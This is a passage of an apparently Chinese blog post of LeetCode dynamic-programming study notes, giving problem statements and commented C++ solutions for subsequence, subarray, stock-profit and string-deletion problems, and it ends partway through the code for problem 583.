<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划</span></span><br><span class="line"><span class="comment">    把上一题【最多两次】寻找规律，普遍化即可</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(<span class="keyword">int</span> k, vector&lt;<span class="keyword">int</span>&gt;&amp; prices)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = prices.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">dp</span>(n,vector&lt;<span class="keyword">int</span>&gt;(<span class="number">2</span>*k+<span class="number">1</span>,<span class="number">0</span>));</span><br><span class="line">        <span class="comment">//初始化</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">2</span>*k+<span class="number">1</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i%<span class="number">2</span>==<span class="number">0</span>)</span><br><span class="line">                dp[<span class="number">0</span>][i] = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                dp[<span class="number">0</span>][i] = -prices[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">2</span>*k+<span class="number">1</span>;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(j==<span class="number">0</span>)</span><br><span class="line">                    dp[i][j] = dp[i<span class="number">-1</span>][j];</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(j%<span class="number">2</span>==<span class="number">0</span>)</span><br><span class="line">                    dp[i][j] = <span class="built_in">max</span>(dp[i<span class="number">-1</span>][j],dp[i<span class="number">-1</span>][j<span class="number">-1</span>]+prices[i]);</span><br><span class="line">                <span class="keyword">else</span>   </span><br><span class="line">                    dp[i][j] = <span class="built_in">max</span>(dp[i<span class="number">-1</span>][j],dp[i<span class="number">-1</span>][j<span class="number">-1</span>]-prices[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n<span class="number">-1</span>][<span class="number">2</span>*k];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="300-最长递增子序列——非连续-递增"><a href="#300-最长递增子序列——非连续-递增" class="headerlink" title="300 最长递增子序列——非连续+递增"></a>300 最长递增子序列——非连续+递增</h3><p>给你一个整数数组 nums ，找到其中【最长严格递增子序列长度】<br>【<strong>子序列</strong>】：是由数组派生而来的序列，删除（或不删除）数组中的元素而不改变其余元素的顺序。<br>例如，[1,3,5,7] 是数组 [1,3,0,6,4,5,7] 的【递增子序列】。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划 nums[]</span></span><br><span class="line"><span class="comment">    dp[i] 【包括当前nums[i]】的最长严格递增子序列长度</span></span><br><span class="line"><span class="comment">    初始化：dp[i]=1;（因为至少包含自身nums[i]）如上</span></span><br><span class="line"><span class="comment">    if(nums[i]&gt;nums[j])</span></span><br><span class="line"><span class="comment">        dp[i]=max(dp[j]+1,dp[i]);</span></span><br><span class="line"><span class="comment">    最终的结果应该是dp[]数组中的最大值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">lengthOfLIS</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(n,<span class="number">1</span>)</span></span>;<span class="comment">//初始为1</span></span><br><span class="line">        <span class="keyword">int</span> res = dp[<span class="number">0</span>];<span class="comment">//记录最大值</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;i;j++)&#123;<span class="comment">//从0开始</span></span><br><span class="line">                <span class="keyword">if</span>(nums[i]&gt;nums[j])&#123;</span><br><span class="line">                    dp[i]=<span class="built_in">max</span>(dp[j]+<span class="number">1</span>,dp[i]);</span><br><span class="line">                    res = <span class="built_in">max</span>(res,dp[i]);<span class="comment">//更新最大值</span></span><br><span class="line">                &#125;       </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="674-最长连续递增序列——连续-递增"><a href="#674-最长连续递增序列——连续-递增" class="headerlink" title="674 最长连续递增序列——连续+递增"></a>674 最长连续递增序列——连续+递增</h3><p>给定一个未经排序的整数数组，找到【最长】且 连续递增的子序列，并返回该序列的长度。<br>例如，[1,6],[2,2,7] 是数组 [0,3,1,6,2,2,7] 的【连续递增子序列】。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划</span></span><br><span class="line"><span class="comment">    dp[i]【包括当前nums[i]】的最长连续递增序列【最大长度】</span></span><br><span class="line"><span class="comment">    初始化：dp[i]=1;</span></span><br><span class="line"><span class="comment">    if(nums[i]&gt;nums[i-1])</span></span><br><span class="line"><span class="comment">        dp[i]=dp[i-1]+1;</span></span><br><span class="line"><span class="comment">    与上一题的区别：</span></span><br><span class="line"><span class="comment">        上一题由于不要求连续，所以使用变量j从0开始遍历，只要小于就更新dp[i]；</span></span><br><span class="line"><span class="comment">        但本题要求连续，更新dp[i]时只能看其前一位dp[i-1]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findLengthOfLCIS</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(n,<span class="number">1</span>)</span></span>;<span class="comment">//初始化1</span></span><br><span class="line">        <span class="keyword">int</span> res = dp[<span class="number">0</span>];<span class="comment">//记录最大值</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i]&gt;nums[i<span class="number">-1</span>])&#123;</span><br><span class="line">                dp[i]=dp[i<span class="number">-1</span>]+<span class="number">1</span>;</span><br><span class="line">                res = <span class="built_in">max</span>(res,dp[i]);<span class="comment">//更新</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="718-最长重复子数组——连续子序列-无增减要求"><a href="#718-最长重复子数组——连续子序列-无增减要求" class="headerlink" title="718 最长重复子数组——连续子序列(无增减要求)"></a>718 最长重复子数组——连续子序列(无增减要求)</h3><p>给两个整数数组 nums1 和 nums2 ，返回 两个数组中【公共的 、长度最长】的子数组的长度。<br><strong>【子数组】：连续子序列</strong><br>输入：nums1 = [1,2,3,2,1], nums2 = [3,2,1,4,7]<br>输出：3<br>解释：长度最长的公共子数组是 [3,2,1]。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划</span></span><br><span class="line"><span class="comment">    dp[i][j] 以nums[i-1]结尾 和 以nums[j-1]结尾 的两个数组 的 最长重复子数组长度</span></span><br><span class="line"><span class="comment">    初始化：dp[0][0] dp[i][0] dp[0][j]都是无意义的</span></span><br><span class="line"><span class="comment">    全都初始化为0</span></span><br><span class="line"><span class="comment">    if(nums1[i-1]==nums2[j-1])</span></span><br><span class="line"><span class="comment">        dp[i][j] = dp[i-1][j-1]+1;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findLength</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums1, vector&lt;<span class="keyword">int</span>&gt;&amp; nums2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> m = nums1.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> n = nums2.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">dp</span>(m+<span class="number">1</span>,vector&lt;<span class="keyword">int</span>&gt;(n+<span class="number">1</span>,<span class="number">0</span>));<span class="comment">//初始0 m+1 n+1</span></span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;<span class="comment">//记录最大值</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;<span class="comment">//因为dp[i][j]表示的是以i-1 j-1结尾的</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(nums1[i<span class="number">-1</span>]==nums2[j<span class="number">-1</span>])</span><br><span class="line">                    dp[i][j] = dp[i<span class="number">-1</span>][j<span class="number">-1</span>]+<span class="number">1</span>;</span><br><span class="line">                res = <span class="built_in">max</span>(res,dp[i][j]);<span class="comment">//更新</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// dp[i][j]直接表示以nums[i]和nums[j]结尾的...</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findLength</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums1, vector&lt;<span class="keyword">int</span>&gt;&amp; nums2)</span> </span>&#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">dp</span> (nums1.<span class="built_in">size</span>() + <span class="number">1</span>, vector&lt;<span class="keyword">int</span>&gt;(nums2.<span class="built_in">size</span>() + <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 要对第一行，第一列经行初始化</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums1.<span class="built_in">size</span>(); i++) <span class="keyword">if</span> (nums1[i] == nums2[<span class="number">0</span>]) dp[i][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; nums2.<span class="built_in">size</span>(); j++) <span class="keyword">if</span> (nums1[<span class="number">0</span>] == nums2[j]) dp[<span class="number">0</span>][j] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums1.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; nums2.<span class="built_in">size</span>(); j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums1[i] == nums2[j] &amp;&amp; i&gt;<span class="number">0</span> &amp;&amp; j&gt;<span class="number">0</span>) &#123; <span class="comment">// 防止 i-1 出现负数</span></span><br><span class="line">                    dp[i][j] = dp[i<span class="number">-1</span>][j<span class="number">-1</span>]+<span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (dp[i][j] &gt; result) result=dp[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="1143-最长公共子序列——两个字符串-非连续子序列"><a href="#1143-最长公共子序列——两个字符串-非连续子序列" class="headerlink" title="1143 最长公共子序列——两个字符串-非连续子序列"></a>1143 最长公共子序列——两个字符串-非连续子序列</h3><p>给定两个字符串 text1 和 text2，返回这两个字符串的【最长公共子序列的长度】。如果不存在 公共子序列，返回 0 。<br><strong>【字符串的子序列】</strong>：由原字符串在不改变字符的相对顺序的情况下删除某些字符（也可以不删除任何字符）后组成的新字符串。</p>
<pre><code>例如，&quot;ace&quot; 是 &quot;abcde&quot; 的子序列，但 &quot;aec&quot; 不是 &quot;abcde&quot; 的子序列。
输入：text1 = &quot;abcde&quot;, text2 = &quot;ace&quot; 
输出：3  
解释：最长公共子序列是 &quot;ace&quot; ，它的长度为 3 。
</code></pre>
<p><strong>与上一题的区别：本题不要求【连续】</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划</span></span><br><span class="line"><span class="comment">    dp[i][j]以[0,i-1]的nums1[i]数组 和 以[0,j-1]的nums2[j]数组 的最长公共子序列长度</span></span><br><span class="line"><span class="comment">    区别：</span></span><br><span class="line"><span class="comment">    if(nums1[i-1]==nums2[j-1])</span></span><br><span class="line"><span class="comment">        dp[i][j]=dp[i-1][j-1]+1;</span></span><br><span class="line"><span class="comment">    else</span></span><br><span class="line"><span class="comment">        dp[i][j]=max(dp[i-1][j],dp[i][j-1]);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">longestCommonSubsequence</span><span class="params">(string text1, string text2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> m=text1.<span class="built_in">size</span>(),n=text2.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">dp</span>(m+<span class="number">1</span>,vector&lt;<span class="keyword">int</span>&gt;(n+<span class="number">1</span>,<span class="number">0</span>));<span class="comment">//初始0</span></span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(text1[i<span class="number">-1</span>]==text2[j<span class="number">-1</span>])</span><br><span class="line">                    dp[i][j] = dp[i<span class="number">-1</span>][j<span class="number">-1</span>]+<span class="number">1</span>,dp[i][j];</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    dp[i][j] = <span class="built_in">max</span>(dp[i<span class="number">-1</span>][j],dp[i][j<span class="number">-1</span>]);<span class="comment">//重点！！！</span></span><br><span class="line">                res = <span class="built_in">max</span>(res,dp[i][j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="1035-不相交的线——最长公共子序列"><a href="#1035-不相交的线——最长公共子序列" class="headerlink" title="1035 不相交的线——最长公共子序列"></a>1035 不相交的线——最长公共子序列</h3><p>在两条独立的水平线上按给定的顺序写下 nums1 和 nums2 中的整数。<br>现在，可以绘制一些连接两个数字 nums1[i] 和 nums2[j] 的直线，这些直线需要同时满足满足：</p>
<pre><code> nums1[i] == nums2[j]
且绘制的直线不与任何其他连线（非水平线）相交。
</code></pre>
<p>请注意，连线即使在端点也不能相交：每个数字只能属于一条连线。<br>以这种方法绘制线条，并返回可以绘制的【最大连线数】。<br><img src="https://img-blog.csdnimg.cn/46cfa198235f489ca3b7786b4867c4a9.png"><br><strong>和上一题一样</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划</span></span><br><span class="line"><span class="comment">    dp[i][j]以nums1[i-1]和nums2[j-1]为结尾的两个数组，最大连线数</span></span><br><span class="line"><span class="comment">    if(nums1[i-1]==nums2[j-1])</span></span><br><span class="line"><span class="comment">        dp[i][j]=dp[i-1][j-1]+1;</span></span><br><span class="line"><span class="comment">    else</span></span><br><span class="line"><span class="comment">        dp[i][j]=max(dp[i-1][j],dp[i][j-1]);</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<h3 id="53-最大子数组和——连续子序列-和"><a href="#53-最大子数组和——连续子序列-和" class="headerlink" title="53 最大子数组和——连续子序列+和"></a>53 最大子数组和——连续子序列+和</h3><p>给你一个整数数组 nums ，请你找出一个具有最大和的连续子数组（子数组最少包含一个元素），返回其最大和。<br>子数组 是数组中的一个连续部分。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划</span></span><br><span class="line"><span class="comment">    dp[i]以nums[i]结尾【包括nums[i]】的 最大子数组和</span></span><br><span class="line"><span class="comment">    误区：dp[i] = max(dp[i-1],dp[i-1]+nums[i]);</span></span><br><span class="line"><span class="comment">    正解：dp[i] = max(nums[i],dp[i-1]+nums[i]);</span></span><br><span class="line"><span class="comment">    关键：</span></span><br><span class="line"><span class="comment">        在于【以nums[i]结尾】，要么以nums[i]结尾只包含一个元素即nums[i]，要么包含很多元素，起始位置在nums[i]前某元素开始。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxSubArray</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(n,<span class="number">0</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> res = nums[<span class="number">0</span>];<span class="comment">//记录结果</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;<span class="comment">//从1开始</span></span><br><span class="line">            dp[i] = <span class="built_in">max</span>(nums[i],dp[i<span class="number">-1</span>]+nums[i]);</span><br><span class="line">            res = <span class="built_in">max</span>(res,dp[i]);<span class="comment">//更新</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">            cout&lt;&lt;dp[i]&lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        cout &lt;&lt;endl;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="392-判断子序列——字符串-不连续"><a href="#392-判断子序列——字符串-不连续" class="headerlink" title="392 判断子序列——字符串-不连续"></a>392 判断子序列——字符串-不连续</h3><p>给定字符串 s 和 t ，判断 s 是否为 t 的子序列。<br>字符串的一个子序列是原始字符串删除一些（也可以不删除）字符而不改变剩余字符相对位置形成的新字符串。（例如，”ace”是”abcde”的一个子序列，而”aec”不是）。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//双指针</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isSubsequence</span><span class="params">(string s, string t)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> m = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> n = t.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(m==<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">int</span> l1 = <span class="number">0</span>, l2 = <span class="number">0</span>, count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(l1&lt;m &amp;&amp; l2&lt;n)&#123;</span><br><span class="line">            <span class="keyword">char</span> c = s[l1];</span><br><span class="line">            <span class="keyword">if</span>(c==t[l2])&#123;</span><br><span class="line">                l1++;</span><br><span class="line">                l2++;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;<span class="keyword">else</span></span><br><span class="line">                l2++;</span><br><span class="line">            <span class="keyword">if</span>(count==m)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//最长公共子序列</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isSubsequence</span><span class="params">(string s, string t)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> m=s.<span class="built_in">size</span>(),n=t.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">dp</span>(m+<span class="number">1</span>,vector&lt;<span class="keyword">int</span>&gt;(n+<span class="number">1</span>,<span class="number">0</span>));<span class="comment">//初始0</span></span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(s[i<span class="number">-1</span>]==t[j<span class="number">-1</span>])</span><br><span class="line">                    dp[i][j] = dp[i<span class="number">-1</span>][j<span class="number">-1</span>]+<span class="number">1</span>,dp[i][j];</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    dp[i][j] = dp[i][j<span class="number">-1</span>];<span class="comment">//注意！</span></span><br><span class="line">                    <span class="comment">//dp[i][j] = max(dp[i-1][j],dp[i][j-1]);//重点！！！</span></span><br><span class="line">                res = <span class="built_in">max</span>(res,dp[i][j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res==m;<span class="comment">//若最长公共子序列-不连续 的长度==m</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/1e99b483795b48ae859034c4b4a5351a.png"></p>
<h3 id="115-不同的子序列——相同-不连续子序列个数-删除元素"><a href="#115-不同的子序列——相同-不连续子序列个数-删除元素" class="headerlink" title="115 不同的子序列——相同-不连续子序列个数[删除元素]"></a>115 不同的子序列——相同-不连续子序列个数[删除元素]</h3><p>给你两个字符串 s 和 t ，统计并返回在 s 的 子序列 中 t 出现的个数。</p>
<pre><code>输入：s = &quot;rabbbit&quot;, t = &quot;rabbit&quot;
输出：3
rab  it
ra b it
ra  bit
</code></pre>
<p><strong>注意</strong>：一种思路是考虑删除s中的元素，而得到字符串t，【删除的不同情况个数】，即s中包含t的不同子序列个数。<br>这样的话，考虑把s中所有元素都删除，也就是说，s中包括空字符串””的个数是1。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划</span></span><br><span class="line"><span class="comment">    dp[i][j]以s[i-1]结尾的字符串中 含有 以t[j-1]为结尾的字符串 的个数。</span></span><br><span class="line"><span class="comment">    初始化：</span></span><br><span class="line"><span class="comment">        dp[i][0]=1; dp[0][j]=0; dp[0][0]=1;</span></span><br><span class="line"><span class="comment">    if(s[i-1]==t[j-1])</span></span><br><span class="line"><span class="comment">        dp[i][j] = dp[i-1][j-1]+dp[i-1][j]; //这里！！ </span></span><br><span class="line"><span class="comment">    else</span></span><br><span class="line"><span class="comment">        dp[i][j] = dp[i-1][j];</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">numDistinct</span><span class="params">(string s, string t)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> m=s.<span class="built_in">size</span>(),n=t.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">uint64_t</span>&gt;&gt; <span class="built_in">dp</span>(m+<span class="number">1</span>,vector&lt;<span class="keyword">uint64_t</span>&gt;(n+<span class="number">1</span>,<span class="number">0</span>));<span class="comment">//初始0</span></span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=m;i++)</span><br><span class="line">            dp[i][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">            dp[<span class="number">0</span>][i] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(s[i<span class="number">-1</span>]==t[j<span class="number">-1</span>])</span><br><span class="line">                    dp[i][j] = dp[i<span class="number">-1</span>][j<span class="number">-1</span>]+dp[i<span class="number">-1</span>][j];</span><br><span class="line">                    <span class="comment">//这里！！！</span></span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    dp[i][j] = dp[i<span class="number">-1</span>][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m][n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="583-两个字符串的删除操作"><a href="#583-两个字符串的删除操作" class="headerlink" title="583 两个字符串的删除操作"></a>583 两个字符串的删除操作</h3><p>给定两个单词 word1 和 word2，找到【使得 word1 和 word2 相同所需的最小步数】，每步可以删除任意一个字符串中的一个字符。<br>示例：</p>
<pre><code>输入: &quot;sea&quot;, &quot;eat&quot;
输出: 2
解释: 第一步将&quot;sea&quot;变为&quot;ea&quot;，第二步将&quot;eat&quot;变为&quot;ea&quot;
</code></pre>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划</span></span><br><span class="line"><span class="comment">    dp[i][j]以word1[i-1]和word2[j-1]为结尾的两个字符串 相同所需要删除的最小次数。</span></span><br><span class="line"><span class="comment">    if(word1[i-1]==word2[j-1])</span></span><br><span class="line"><span class="comment">        dp[i][j]=dp[i-1][j-1];</span></span><br><span class="line"><span class="comment">    else</span></span><br><span class="line"><span class="comment">        dp[i][j]=min(dp[i-1][j]+1,dp[i][j-1]+1,dp[i-1][j-1]+2);</span></span><br><span class="line"><span class="comment">    初始化：</span></span><br><span class="line"><span class="comment">        dp[i][0] = i;</span></span><br><span class="line"><span class="comment">        dp[0][j] = j;</span></span><br><span class="line"><span class="comment">        dp[0][0] = 0;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minDistance</span><span class="params">(string word1, string word2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> m = word1.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> n = word2.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">dp</span>(m+<span class="number">1</span>,vector&lt;<span class="keyword">int</span>&gt;(n+<span class="number">1</span>,<span class="number">0</span>));</span><br><span class="line">        dp[<span 